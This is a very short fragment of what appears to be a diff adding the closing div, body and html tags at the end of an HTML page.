+</div>
+  </body>
+</html>
